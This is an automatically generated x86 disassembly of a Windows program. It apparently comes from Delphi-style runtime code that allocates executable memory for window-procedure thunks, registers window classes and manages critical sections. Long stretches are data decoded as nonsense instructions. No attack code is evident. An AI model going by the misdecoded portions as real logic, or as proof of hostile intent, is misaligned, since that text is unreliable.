mov eax [ rw-data ]
call sub_418898
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418470
call sub_403190
inc esi
dec ebx
jne r-xdata
sub_4217bc
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_4217e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028d8
mov edx sub_4217bc
lea eax [ esi + 0x5 ]
call sub_4217dc
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4217dc
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_4218a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406b44
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4217e4
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_421954
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_42187c
sub_42197c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421a20
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421a27
retn
mov eax [ rw-data ]
call sub_417a58
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_421748
xor edx edx
xor eax eax
call sub_41b824
mov eax rw-data
call sub_40d1d0
call sub_405ebc
lea eax [ eax + 0xc ]
call sub_40d1d0
mov eax rw-data
call sub_40d1d0
mov eax rw-data
call sub_40578c
mov eax sub_4217b4
call sub_405628
mov eax rw-data
call sub_40d1d0
call sub_420574
mov eax rw-data
call sub_40d1d0
mov eax rw-data
call sub_40578c
sub_421a2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421ab5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421abc
retn
call sub_420540
mov eax sub_4217b4
call sub_405620
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cf10
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4057a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_417354
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4186dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4186dc
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_421ac0
out 0x47 al
add [ ebp + 0x640000ff ] cl
out 0x47 al
add [ esi + 0x640000ff ] cl
out 0x47 al
add [ edi + 0x640000ff ] cl
out 0x47 al
add [ eax - 0x1 ] dh
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] dh
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] dh
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] dh
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] dh
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] dh
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] dh
add [ eax ] al
out 0x47 al
add [ eax - 0x1 ] bh
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] bh
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] bh
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] bh
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] bh
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] bh
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] bh
add [ eax ] al
out 0x47 al
add [ eax - 0x1 ] ah
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] ah
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] ah
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] ah
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] ah
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] ah
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] ah
add [ eax ] al
out 0x47 al
add [ eax - 0x1 ] ch
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] ch
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] ch
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] ch
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] ch
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] ch
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] ch
add [ eax ] al
out 0x47 al
add [ eax - 0x1 ] dl
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] dl
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] dl
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] dl
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] dl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] dl
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] dl
add [ eax ] al
out 0x47 al
add [ eax - 0x1 ] bl
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] bl
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] bl
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] bl
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] bl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] bl
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] bl
add [ eax ] al
out 0x47 al
add [ eax - 0x1 ] al
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] al
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] al
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] al
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] al
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] al
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] al
add [ eax ] al
out 0x47 al
add [ eax - 0x1 ] cl
add [ eax ] al
out 0x47 al
add [ ecx - 0x1 ] cl
add [ eax ] al
out 0x47 al
add [ edx - 0x1 ] cl
add [ eax ] al
out 0x47 al
add [ ebx - 0x1 ] cl
add [ eax ] al
out 0x47 al
add [ edi + edi * 8 ] cl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
out 0x47 al
add [ esi - 0x1 ] cl
add [ eax ] al
out 0x47 al
add [ edi - 0x1 ] cl
add [ eax ] al
out 0x47 al
add [ eax ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
out 0x47 al
add [ 0x640000ff ] dh
out 0x47 al
add [ esi ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
out 0x47 al
add [ 0x640000ff ] bh
out 0x47 al
add [ esi ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_421d95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d9c
retn
sub_421da8
lodsb [ esi ]
sbb eax 0x6010042
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
or al 0x1e
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx ] cl
inc edx
add [ eax + eax ] cl
add [ eax ] al
sub_42269a
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x42 ] al
add [ edi + 0x42 ] cl
add [ eax ] ch
add [ eax ] al
add al bh
pop esi
inc ecx
add al bl
xor eax [ eax ]
sub [ ecx + eax * 2 + 0x4033e800 ] cl
add ah ch
xor eax [ eax ]
loopne r-xdata
popad
inc edx
add ah al
popad
inc edx
add [ eax + 0x44004029 ] dl
bound eax [ edx ]
nop
sub [ eax ] eax
test al 0x62
inc edx
add [ edx + 0x29900042 ] ch
inc eax
add [ edx + 0x5f840042 ] bh
inc edx
add al cl
popad
inc edx
add [ eax + 0x62 ] dl
inc edx
add [ eax - 0x6fffbfd7 ] dl
sub [ eax ] eax
nop
sub [ eax ] eax
nop
sub [ eax ] eax
add [ eax ] eax
std
[ edx ]
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop eax
mov al [ ecx ]
push 0x2c00418b
pushad
inc edx
add [ edx + ecx * 4 - 0x7347ffbf ] al
inc ecx
add [ edi + ebx * 2 + 0x29900042 ] bh
inc eax
add [ eax + 0x60 ] bh
inc edx
add [ eax - 0x6fffbfd7 ] dl
sub [ eax ] eax
shl [ ecx + 0x42 ] 0x0
les esp [ ecx + 0x42 ]
lea esp [ edi ]
inc edx
add [ ebx - 0x5affbdd9 ] bl
jo r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
sub [ ebp + 0x42 ] ah
add [ eax + 0x65 ] bl
inc edx
add [ eax - 0xfffbd96 ] cl
inc edx
add [ eax + 0xe00418c ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x18004221 ] bl
add [ eax ] al
add [ edx ] al
add ch bh
daa
inc edx
add [ ebp + 0x27 ] bh
inc edx
add [ ebp + 0x1004227 ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
imul esp [ ebx - 0x73 ] 0x275c0040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x20 ] 0x7c004226
pop edi
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + ebp + 0x42 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x28 ] dl
inc edx
add [ eax + ebp + 0x42 ] ah
add [ eax + eax ] ch
add [ eax ] al
clc
pop esi
inc ecx
add al bl
xor eax [ eax ]
sub [ ecx + eax * 2 + 0x4033e800 ] cl
add ah ch
xor eax [ eax ]
loopne r-xdata
inc edx
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
fnsave [ edx + 0x28004227 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x422834c0 ] cl
jo r-xdata
add dh al
daa
inc edx
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x42 ] al
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
xor al 0x28
inc edx
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_4267c0
sub_42285a
cld
dec [ eax + ebp * 2 + 0x42 ]
add [ eax + 0x68 ] dh
inc edx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ eax + ebp + 0x42 ] dh
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
xor al 0x28
inc edx
add [ edi + ebx * 2 + 0x41 ] bh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
inc eax
sub [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub [ edx ] eax
and al 0x0
jo r-xdata
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x2a
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
aam 0x6a
inc edx
add [ eax ] dl
imul eax [ edx ] 0xe
push esp
dec ebp
je r-xdata
add [ eax ] al
xchg esp eax
sub [ edx ] al
fdiv [ ebx ]
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec426960
xor eax [ eax ]
loopne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xe0900000
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x28
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
insd
inc edx
add ah al
popad
inc edx
add [ eax - 0x77ffbd93 ] ch
outsb
inc edx
add [ edx + esi * 2 ] ah
inc edx
add [ eax + 0x10004262 ] ch
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop esp
imul eax [ edx ] 0x68
mov eax [ ecx ]
sub al 0x60
inc edx
add [ ebx + ebp * 2 - 0x7347ffbe ] cl
inc ecx
add [ edi + ebx * 2 + 0x6c200042 ] bh
inc edx
add [ eax + 0x60 ] bh
inc edx
add [ eax - 0x47ffbd94 ] dh
insb
inc edx
add [ ebp * 2 + 0x61c40042 ] bl
add [ eax - 0x43ffbe74 ] bh
pop edi
inc edx
add [ eax ] ah
insb
inc edx
add [ eax ] dh
add [ eax ] al
add [ esi + 0x33d80042 ] dl
inc eax
add [ eax ] ch
mov [ ecx ] es
call 0xffffffffec4269c0
xor eax [ eax ]
loopne r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
mov al [ 0x4229 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x42 ] al
add [ eax + eax ] ah
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax + 0xc004029 ] dl
push esp
push ebx
push 0x64657261
dec ecx
inc edx
add [ ebx + esi * 2 ] dl
inc edx
add [ esp + esi * 2 + 0x42 ] ch
add [ ebx + ebp * 2 ] dl
inc edx
add al cl
popad
inc edx
add [ ecx + esi * 2 + 0x42 ] al
add [ esi + ebp * 2 ] cl
inc edx
add [ eax ] cl
jb r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add al al
jbe r-xdata
fdiv [ ebx ]
inc eax
add [ eax ] ch
mov [ ecx ] es
call 0xffffffffec426b00
xor eax [ eax ]
loopne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2b ] dl
inc edx
add [ eax + eax ] bh
imul esp [ ebx + 0x73 ] 0x2a800000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
inc edx
add al bl
sub eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
sub eax [ edx ]
cmp al 0x0
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x740042 ] al
add [ eax ] al
xchg esp eax
sub [ edx ] al
fdiv [ ebx ]
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec426aa0
add [ edi + esi * 2 + 0x42 ] al
add [ ecx ] cl
push esp
dec ebp
je r-xdata
mov [ edx ] es
les esp [ ecx + 0x42 ]
add ah dl
mov [ edx ] es
rcl [ eax - 0x6743ffbe ] 0x42
add [ eax - 0x53ffbd67 ] dl
bound eax [ edx ]
mov ah 0x9a
inc edx
add [ eax ] cl
fwait
inc edx
add al bl
test [ edx ] eax
enter 0x4261 0x0
push eax
bound eax [ edx ]
pushfd
pop [ edx ]
enter 0x429d 0x0
sbb [ edi - 0x622fffbe ] cl
inc edx
add al ch
mov eax [ edx ]
dec eax
mov [ edx ] es
test [ edi + 0x54070042 ] dl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x422b5c70
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x422ae070
add [ eax + 0x27 ] bl
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
inc eax
xchg [ edx ] al
push 0x2c00418b
pushad
inc edx
add [ esi + eax * 4 + 0x42 ] bh
add [ eax + 0x5000418c ] bh
mov [ edx ] al
ror [ eax + 0x60780042 ] 0x1
inc edx
add [ ebx + ecx * 4 - 0x73c7ffbe ] al
inc edx
add [ eax - 0x74 ] bh
inc edx
add ah al
popad
inc edx
xor eax [ eax ]
sub [ ecx + eax * 2 + 0x4033e800 ] cl
add ah ch
lea eax [ bx + si ]
loopne r-xdata
add [ eax + 0xc00427b ] dh
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
xor eax [ eax ]
loopne r-xdata
add ah ch
imul bp [ ebp - 0x75 ] 0x14c0
sub al [ edx ]
pop es
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
popad
nop
and al 0x2c
inc edx
add [ eax ] al
jo r-xdata
push esp
jpo r-xdata
add [ eax + 0x27 ] bl
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul bp [ ebp - 0x60 ] 0x4229
popad
inc edx
add ah al
popad
inc edx
add [ eax ] bl
inc edx
add [ edx + 0x42 ] al
add [ eax - 0x57ffbd5e ] ah
bound eax [ edx ]
mov eax 0xbc0042a2
mov [ 0x62bc0042 ] al
inc edx
add [ eax - 0x37ffbd62 ] bh
popad
inc edx
add [ eax + 0x62 ] dl
inc edx
add [ ecx + 0x42 ] bl
add ah dl
mov [ 0xffffffffa2fc0042 ] al
inc edx
add [ eax ] dl
mov [ 0x54050042 ] eax
dec ecx
arpl [ edi + 0x6e ] bp
mov eax eax
xchg esp eax
sub al 0x42
add [ edi ] al
add eax 0x6f634954
outsb
and al 0x2c
inc edx
add [ eax + 0x27 ] bl
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
or al 0x9f
inc edx
add [ eax - 0x75 ] ch
inc ecx
add [ eax ] ch
inc edx
add [ edi + ebx * 4 ] bh
inc edx
add [ eax - 0x43ffbe74 ] bh
pop edi
inc edx
add [ edi + ebx * 4 + 0x60780042 ] bl
inc edx
add ah bl
lahf
inc edx
add [ eax ] cl
mov al [ 0x61c00042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + eax * 2 ] ch
add [ eax + eax ] dh
add [ eax ] al
xchg esp eax
inc edx
add al bl
xor eax [ eax ]
sub [ ecx + eax * 2 + 0x4033e800 ] cl
add ah ch
xor eax [ eax ]
loopne r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
enter 0x422b 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc eax
add [ ebp + ebp + 0x42 ] dh
add [ eax ] dl
push esp
push edx
jo r-xdata
xor edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
call sub_403544
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422cc4
adc [ 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ 0x240042 ] ch
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
lea eax [ eax ]
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
je r-xdata
shl [ eax + ecx - 0x7d ] cl
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
xor edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
call sub_403544
mov eax esi
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422d38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_422d74
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_422db0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_422d24
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_422d98
xor edx edx
push ebp
push sub_422e84
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422e8b
mov eax [ ebp - 0x4 ]
call sub_422da4
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407dac
test al al
je r-xdata
sub_422e94
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d98
xor ecx ecx
push ebp
push sub_422f1b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422da4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_422f44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d98
xor eax eax
push ebp
push sub_422fad
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422db0
mov esi eax
